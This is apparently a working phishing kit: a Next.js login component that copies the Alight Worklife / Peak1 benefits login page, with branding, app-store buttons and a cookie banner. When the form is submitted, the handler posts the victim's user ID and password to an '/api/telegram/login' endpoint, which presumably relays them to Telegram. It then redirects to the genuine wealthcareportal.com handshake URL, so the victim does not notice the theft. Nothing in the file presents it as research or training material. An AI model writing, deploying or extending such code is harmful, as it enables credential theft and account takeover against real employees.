"use client";

import "../index.css";
import type React from "react";
import { useState } from "react";
import { useRouter } from "next/navigation";

interface LoginFormProps {
  visitorInfo?: any;
}

export function LoginForm({ visitorInfo }: LoginFormProps) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isScreenReader, setIsScreenReader] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [userIdError, setUserIdError] = useState<string | null>(null);
  const [mobileLoginLoading, setMobileLoginLoading] = useState(false);
  const [forgotPasswordLoading, setForgotPasswordLoading] = useState(false);
  const [newUserLoading, setNewUserLoading] = useState(false);
  const [showCookieNotice, setShowCookieNotice] = useState(true);

  const router = useRouter();

  const handleMobileLoginClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (mobileLoginLoading) return;
    setMobileLoginLoading(true);
    setTimeout(() => {
      setMobileLoginLoading(false);
    }, 1000);
  };

  const handleForgotPasswordClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (forgotPasswordLoading) return;
    setForgotPasswordLoading(true);
    setTimeout(() => {
      router.push("/forgot-password");
    }, 2000);
  };

  const handleNewUserClick = (e: React.MouseEvent) => {
    e.preventDefault();
    if (newUserLoading) return;
    setNewUserLoading(true);
    setTimeout(() => {
      router.push("/new-user");
    }, 2000);
  };

  const handleUserIdChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value;

    // Prevent "@" character from being entered
    if (value.includes("@")) {
      setUserIdError("User ID not valid.");
      // Remove the "@" character
      value = value.replace(/@/g, "");
      e.target.value = value;
    } else {
      setUserIdError(null);
    }

    setUserId(value);
  };

  const isEmailFormat = (value: string): boolean => {
    return value.includes("@");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isLoading) return;

    setSubmitError(null);

    // Validate User ID is not an email
    if (isEmailFormat(userId)) {
      setSubmitError("User ID not valid.");
      return;
    }

    setIsLoading(true);

    try {
      const res = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, password }),
      });

      if (!res.ok) {
        const body = await res.json().catch(() => null);
        setSubmitError(body?.error || "Login failed. Please try again.");
        setIsLoading(false);
        return;
      }
    } catch (error) {
      setSubmitError("Unable to submit login right now.");
      setIsLoading(false);
      return;
    }

    sessionStorage.setItem("ubs_verify", "1");

    setTimeout(() => {
      window.location.href =
        "https://peak1.wealthcareportal.com/Authentication/Handshake";
    }, 3000);
  };

  return (
    <div className="landing-page-container">
      <main className="hero" aria-label="Primary landing page content">
        <div className="login-panel">
          <img className="sf-logo" src="/LoginLogo.png" alt="Peak1" />

          <form onSubmit={handleSubmit}>
            <div className="input-row">
              <div className="icon-box" aria-hidden="true">
                <svg viewBox="0 0 24 24">
                  <path d="M12 12c2.67 0 8 1.34 8 4v2H4v-2c0-2.66 5.33-4 8-4zm0-2a4 4 0 1 0 0-8 4 4 0 0 0 0 8z" />
                </svg>
              </div>
              <input
                id="user-id"
                name="userId"
                type="text"
                placeholder="User ID"
                autoComplete="username"
                value={userId}
                onChange={handleUserIdChange}
                style={userIdError ? { borderColor: "#dc2626" } : {}}
              />
            </div>
            {userIdError && (
              <p
                style={{
                  color: "#dc2626",
                  fontSize: "13px",
                  marginTop: "4px",
                  marginBottom: "8px",
                }}
              >
                {userIdError}
              </p>
            )}

            <div className="alight-btn-row">
              <button
                type="button"
                className="alight-btn"
                onClick={handleMobileLoginClick}
              >
                {mobileLoginLoading ? "Loading..." : "Login with Alight Mobile"}
              </button>
              <span className="help-badge">?</span>
            </div>

            <div className="input-row">
              <div className="icon-box" aria-hidden="true">
                <svg viewBox="0 0 24 24">
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                </svg>
              </div>
              <input
                id="pwdInput"
                name="password"
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            <label className="show-pwd-row">
              <input
                type="checkbox"
                checked={showPassword}
                onChange={(e) => setShowPassword(e.target.checked)}
              />
              Show Password
            </label>

            <button
              type="submit"
              className="logon-btn"
              disabled={isLoading || !!userIdError}
            >
              {isLoading ? "Loading..." : "Log On"}
            </button>

            {submitError && <p className="submit-error">{submitError}</p>}

            <div className="login-links">
              <a href="#" onClick={handleForgotPasswordClick}>
                {forgotPasswordLoading
                  ? "Loading..."
                  : "Forgot User ID or Password?"}
              </a>
              <a href="#" onClick={handleNewUserClick}>
                {newUserLoading ? "Loading..." : "New User?"}
              </a>
            </div>

            <div className="help-row">
              <a href="#">Help</a>
              <span className="help-badge">?</span>
            </div>

            <label className="screen-reader-row">
              <input
                type="checkbox"
                checked={isScreenReader}
                onChange={(e) => setIsScreenReader(e.target.checked)}
              />
              Use this site with a screen reader
            </label>
          </form>
        </div>

        <div className="hero-right">
          <div className="photos-area">
            <div className="photo-card card-1">
              <img
                src="https://images.unsplash.com/photo-1529156069898-49953e39b3ac?w=460&h=540&fit=crop&crop=faces&auto=format&q=80"
                alt="Family group"
              />
              <div className="insta-bottom">
                <span className="heart-icon">♥</span>
                <span className="comment-icon">💬</span>
                <span className="share-icon">✈</span>
                <div className="insta-dots">
                  <div className="dot active"></div>
                  <div className="dot"></div>
                  <div className="dot"></div>
                </div>
              </div>
            </div>

            <div className="photo-card card-2">
              <img
                src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=350&h=430&fit=crop&crop=faces&auto=format&q=80"
                alt="Woman selfie"
              />
              <div
                className="insta-dots"
                style={{ padding: "5px 7px", background: "#fff" }}
              >
                <div className="dot active"></div>
                <div className="dot"></div>
              </div>
              <span className="save-corner">🔖</span>
            </div>

            <div className="photo-card card-3">
              <img
                src="https://images.unsplash.com/photo-1609220136736-443140cffec6?w=370&h=380&fit=crop&crop=faces&auto=format&q=80"
                alt="Happy family"
              />
              <span className="save-corner">🔖</span>
            </div>
          </div>

          <div className="hero-headline">
            Your
            <br />
            <span className="red">benefits,</span>
            your
            <br />
            story.
          </div>
        </div>
      </main>

      <footer>
        <div className="footer-top">
          <div className="footer-links">
            <a href="#">Contact Us</a>
            <a href="#">Feedback</a>
            <a href="#">Protect Yourself From Website Fraud</a>
          </div>
          <div className="footer-right">
            <div className="alight-worklife-logo">
              alight<span className="wl-colored">worklife</span>
              <span className="wl-dot">.</span>
            </div>
            <div className="app-buttons">
              <a href="#" className="app-btn">
                <svg viewBox="0 0 24 24" fill="#fff">
                  <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
                </svg>
                <div className="app-btn-text">
                  <span className="app-btn-small">Download on the</span>
                  <span className="app-btn-big">App Store</span>
                </div>
              </a>
              <a href="#" className="app-btn">
                <svg viewBox="0 0 24 24" fill="none" width="22" height="22">
                  <path
                    d="M3.18 23.76c.33.18.7.22 1.06.1l11.3-6.53-2.38-2.38-9.98 8.81z"
                    fill="#EA4335"
                  />
                  <path
                    d="M21.54 10.27c-.47-.4-1.08-.63-1.74-.63-.3 0-.6.05-.88.14L3.18.24C2.82.12 2.45.16 2.12.34L13.16 11.4l8.38-1.13z"
                    fill="#FBBC04"
                  />
                  <path
                    d="M2.12.34C1.67.6 1.38 1.09 1.38 1.67v20.66c0 .58.29 1.07.74 1.33L13.16 12.6 2.12.34z"
                    fill="#4285F4"
                  />
                  <path
                    d="M19.8 9.78l-2.64 1.52-3.0 3.1 3.0 3.1 2.64 1.52c.77-.44 1.22-1.22 1.22-2.12v-5c0-.9-.45-1.68-1.22-2.12z"
                    fill="#34A853"
                  />
                </svg>
                <div className="app-btn-text">
                  <span className="app-btn-small">GET IT ON</span>
                  <span className="app-btn-big">Google Play</span>
                </div>
              </a>
            </div>
          </div>
        </div>

        <div className="footer-bottom">
          <div className="footer-legal-links">
            <a href="#">Privacy Policy</a>
            <a href="#">Terms Of Use</a>
            <a href="#">Cookie Notice</a>
            <a href="#">
              Cookie Settings [Do Not Sell or Share My Personal Information]
            </a>
          </div>
          <span className="copyright">
            ©2026 Alight Solutions. All rights reserved.
          </span>
        </div>
      </footer>

      {showCookieNotice && (
        <div
          className="cookie-notice-bottom"
          role="region"
          aria-label="Cookie notice"
        >
          <p>
            We use cookies to deliver the best possible experience on our
            website. You may disable them from your browser at any time. To
            learn more, please see our Cookie Notice. By selecting Accept
            Cookies, you consent to our use of cookies.&nbsp;
            <a href="#">Cookie Notice</a>
          </p>
          <div className="cookie-btns">
            <button
              type="button"
              className="btn-outline-cookie"
              onClick={() => setShowCookieNotice(false)}
            >
              Customize
            </button>
            <button
              type="button"
              className="btn-solid-cookie"
              style={{ background: "#1a56db", borderColor: "#1a56db" }}
              onClick={() => setShowCookieNotice(false)}
            >
              Reject Cookies
            </button>
            <button
              type="button"
              className="btn-solid-cookie"
              onClick={() => setShowCookieNotice(false)}
            >
              Accept Cookies
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
